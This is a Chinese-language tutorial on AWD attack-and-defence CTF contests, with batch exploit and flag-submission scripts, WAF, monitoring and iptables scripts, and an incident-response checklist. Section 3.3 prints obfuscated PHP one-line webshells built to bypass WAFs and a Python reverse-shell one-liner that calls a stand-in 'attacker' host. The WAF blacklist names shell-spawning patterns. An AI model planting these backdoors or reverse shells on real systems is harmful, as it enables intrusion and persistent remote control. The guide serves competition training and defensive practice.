# AWD（Attack With Defence）攻防赛脚本编写与部署实战指南

## 1. AWD 赛制简介

**AWD（Attack With Defence）** 是 CTF 的经典攻防赛制。每个战队拿到一台或多台 Web 服务器，既需要**防御自己的服务不被攻破**，又需要**攻击其他战队的服务获取 flag**。

| 要素 | 说明 |
|------|------|
| 角色 | 同一服务（如 Web + MySQL）部署在多台服务器上，每队一台 |
| Flag | 服务每隔几分钟自动生成新 flag，访问 `/flag` 或触发特定路径得到 |
| 得分 | 攻击其他战队成功 → 加分；被打 → 扣分；正常服务 → 加分 |
| 时长 | 通常 2-5 小时 |
| 关键能力 | Web 渗透、Python/Bash 脚本、补丁能力、应急响应 |

## 2. 战前准备：工具箱

### 2.1 本地环境与依赖

```bash
# Python 基础工具（批量攻击必备）
pip install requests PyYAML pwntools numpy

# 目录扫描
git clone https://github.com/maurosoria/dirsearch.git
git clone https://github.com/OJ/gobuster

# 字典
# /usr/share/wordlists/rockyou.txt（kali）
# SecLists：https://github.com/danielmiessler/SecLists

# 漏洞 PoC 仓库
git clone https://github.com/CHYbeta/Code-Audit-Challenges
git clone https://github.com/Reber0777/Web-Shell-Collection
git clone https://github.com/0xsirus/AWD-Predator-Face
```

### 2.2 关键脚本模板

每个战队应当在赛制开始前准备好以下脚本模板：

```
├── attack/
│   ├── get_flag.py            # 批量访问 flag 接口获取 flag
│   ├── submit_flag.py         # 批量提交 flag 到平台
│   ├── exploit_template.py    # 通用漏洞利用模板（含目标列表输入）
│   └── shell_launcher.py      # 反弹 shell 批量触发脚本
├── defense/
│   ├── patch_*.py             # 各漏洞修补脚本
│   ├── waf/                   # 简易 WAF（nginx、python、iptables）
│   └── monitor/               # 告警脚本 + 流量检测 + 文件监控
├── recon/
│   ├── scan_ports.py          # 多目标端口扫描
│   ├── dir_brute.py           # 批量目录爆破
│   └── diff.py                # 源码 diff 识别修改点
└── shell/
    ├── webshell.php           # 一句话后门（变形版）
    ├── reverse_shell.py       # Python 反弹
    └── reverse_shell.php      # PHP 反弹
```

## 3. 攻击脚本：从 PoC 到批量打靶

### 3.1 漏洞扫描 + 批量利用框架

```python
#!/usr/bin/env python3
# exploit_template.py - 批量攻击模板
import requests
import sys
import concurrent.futures
import time

requests.packages.urllib3.disable_warnings()

HEADERS = {"User-Agent": "Mozilla/5.0"}
TIMEOUT = 5


def exploit(target: str) -> str:
    """对单个目标执行攻击，返回 flag 或空字符串"""
    url = f"http://{target}/vulnerable_endpoint"
    payload = {
        "cmd": "cat /flag",  # 或 "system('cat /flag')"、"exec('cat /flag')" 等
    }
    try:
        r = requests.post(url, data=payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
        # 从响应中正则提取形如 flag{...} 的 flag
        import re
        m = re.search(r"flag\{[^}]{8,64}\}", r.text)
        if m:
            return target, m.group(0)
    except Exception as e:
        return target, ""
    return target, ""


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} targets.txt")
        sys.exit(1)

    with open(sys.argv[1]) as f:
        targets = [line.strip() for line in f if line.strip()]

    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        for target, flag in executor.map(exploit, targets):
            if flag:
                results[target] = flag
                print(f"[+] {target}: {flag}")
            else:
                print(f"[-] {target}: failed")

    # 保存结果，用于批量提交
    with open(f"flags-{int(time.time())}.txt", "w") as f:
        for t, fl in results.items():
            f.write(f"{t} {fl}\n")


if __name__ == "__main__":
    main()
```

### 3.2 Flag 批量提交脚本

```python
#!/usr/bin/env python3
# submit_flag.py - 提交 flag 到平台
import requests
import sys
import concurrent.futures

PLATFORM = "http://10.0.0.1/api/submit_flag"
TOKEN = "your_team_token_here"

def submit(flag: str) -> None:
    try:
        r = requests.post(PLATFORM, json={"flag": flag, "token": TOKEN}, timeout=3)
        print(f"[SUBMIT] {flag} -> {r.status_code} {r.text[:80]}")
    except Exception as e:
        print(f"[ERR] {flag}: {e}")


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} flag_file.txt")
        sys.exit(1)
    with open(sys.argv[1]) as f:
        flags = set()
        for line in f:
            parts = line.strip().split()
            if parts:
                # 容忍两种格式："ip flag{xxx}" 或 "flag{xxx}"
                flag = parts[-1] if "flag{" in parts[-1] else None
                if flag:
                    flags.add(flag)

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        ex.map(submit, flags)


if __name__ == "__main__":
    main()
```

### 3.3 一句话后门（变形）

```php
<?php
// shell_xxx.php —— 变形一句话
// 1) 经典版
@eval($_POST['c']);

// 2) 绕过 WAF 的版本（assert + 可变变量）
$x = 'a'.'s'.'s'.'e'.'r'.'t';
$x($_POST['c']);

// 3) create_function 版
$f = create_function('', $_POST['c']);
$f();

// 4) preg_replace /e 版（PHP < 7.0）
@preg_replace('/.*/e', $_POST['c'], 'x');

// 5) 反弹 shell（Python 版更稳定）
//    python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

## 4. 防御脚本：加固与监控

### 4.1 简易 WAF（Python Flask 代理）

```python
#!/usr/bin/env python3
# mini_waf.py - 简易 WAF
from flask import Flask, request, abort
import requests

app = Flask(__name__)
BACKEND = "http://127.0.0.1:8080"

BLACKLIST = [
    "union select", "information_schema", "sleep(",
    "<?php", "eval(", "assert(", "system(", "exec(",
    "../../../../", "../..%2f", "file://", "php://",
    "bash -i", "python.*socket",
]

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    raw = request.get_data(as_text=True).lower()
    url = request.url.lower()
    for kw in BLACKLIST:
        if kw in raw or kw in url:
            with open("/tmp/waf.log", "a") as f:
                f.write(f"[BLOCK] {request.remote_addr} {kw} {raw[:200]}\n")
            abort(403)
    # 正常转发到后端
    r = requests.request(
        method=request.method,
        url=f"{BACKEND}/{path}",
        headers={k: v for k, v in request.headers if k.lower() != 'host'},
        data=request.get_data(),
        params=request.args,
    )
    return r.content, r.status_code

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

### 4.2 文件完整性监控（防止 Web 木马植入）

```bash
#!/bin/bash
# file_monitor.sh - 文件完整性监控
BASE=/var/www/html
HASH_FILE=/tmp/web.hash
ALERT=/tmp/alert.log

# 第一次初始化
if [ ! -f "$HASH_FILE" ]; then
    find "$BASE" -type f -exec md5sum {} \; > "$HASH_FILE"
    exit 0
fi

# 对比
diff <(find "$BASE" -type f -exec md5sum {} \;) "$HASH_FILE" > /tmp/diff.txt
if [ -s /tmp/diff.txt ]; then
    echo "[$(date)] FILE CHANGED:" >> $ALERT
    cat /tmp/diff.txt >> $ALERT
fi
# 每分钟运行一次，加入 crontab
```

### 4.3 iptables 防御（基本策略）

```bash
#!/bin/bash
# harden_iptables.sh
iptables -F
iptables -X
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT      # Web 服务
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT   # SSH 仅限内网
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP    # 禁 ping
iptables -A INPUT -j DROP
iptables-save > /etc/iptables/rules.v4
```

## 5. 实战流程：从"拿到靶机"到"拿分"

```
第 0 分钟（赛前）
  └─ 准备所有脚本模板、字典、一句话后门、反弹 shell

第 0-5 分钟（初入网段）
  └─ 扫描其他战队 IP，确定每队 web 服务地址
  └─ 访问 `http://ip:port/`，判断服务类型（PHP / Java / Python）
  └─ 访问 `http://ip:port/flag` / `index.php?f=../../flag` 等路径

第 5-15 分钟（信息收集）
  └─ 源码比对（如果允许，diff 出修改点 → 往往就是漏洞提示）
  └─ dirsearch / gobuster 批量目录爆破
  └─ 识别常见漏洞点（SQLi、RCE、反序列化、文件上传）

第 15-30 分钟（首杀）
  └─ 写 PoC，本地测试后投入批量攻击脚本
  └─ 批量获取 flag → 提交平台

第 30-120 分钟（持续攻防）
  └─ 部署 WAF / 打补丁 / 监控日志
  └─ 挖掘新漏洞（每道题往往含多个漏洞点）
  └─ 被打时应急：看日志、回滚文件、打补丁、重启服务

第 120+ 分钟（抢分收尾）
  └─ 持续跑批量脚本
  └─ 部署"通防"：备份 Web 源码、禁用危险函数、文件只读
  └─ 监控异常进程（ps、top），防止被反弹 shell 长期驻留
```

## 6. 应急响应 SOP

| 现象 | 动作 |
|------|------|
| flag 被他人提交但自己服务正常 | 可能被 webshell / 漏洞拿到 flag → 看 access.log |
| 服务挂了（502 / 无响应） | 立即重启 / 恢复备份；检查是否被 RCE 干掉 |
| 文件被篡改（md5 变化） | 恢复源文件 + 检查是否留后门 |
| CPU 100% | 很可能被挖矿 / 反弹 shell 批量执行；`kill -9` + 找进程 |
| 数据库异常 | `show processlist` + 检查数据库访问来源 |

## 7. 关键技巧总结

```
① 早：最早拿到 PoC 的战队得分最多 → 速度是王道
② 稳：本地测试 OK 再上线；上线后批量验证
③ 变：一句话后门 / PoC payload 每队变形，避免"被对手拿现成的用"
④ 守：部署 WAF + 文件监控 + 备份源码，防止被打穿一次就丢所有分
⑤ 听：平台公告、flag 格式变更、新漏洞披露
```

## 8. 常用命令速查

```bash
# 进程监控
ps auxf --sort=-%cpu | head -20
top -c -b -n 1 | head -30

# 网络监控
netstat -antpl
ss -tlnp
tcpdump -i any -nn -w /tmp/traffic.pcap &

# 文件监控
inotifywait -m -r -e create,modify /var/www/html &
find /var/www/html -newer /tmp/baseline -type f

# 批量获取 flag（bash）
for ip in $(cat targets.txt); do
    echo -n "$ip "
    curl -s -m 3 "http://$ip/api/flag" | grep -o "flag{[^}]*}" | head -1
done | tee flags.txt

# 批量提交
for f in $(grep -o "flag{[^}]*}" flags.txt | sort -u); do
    curl -s -X POST $PLATFORM -H "Token: $TOKEN" -d "flag=$f"
done
```

> AWD 赛制的精髓是"**速度与持续攻防**"。打好基础（脚本模板）、保持冷静（应急响应）、持续创新（挖掘新漏洞），是得分的关键三要素。
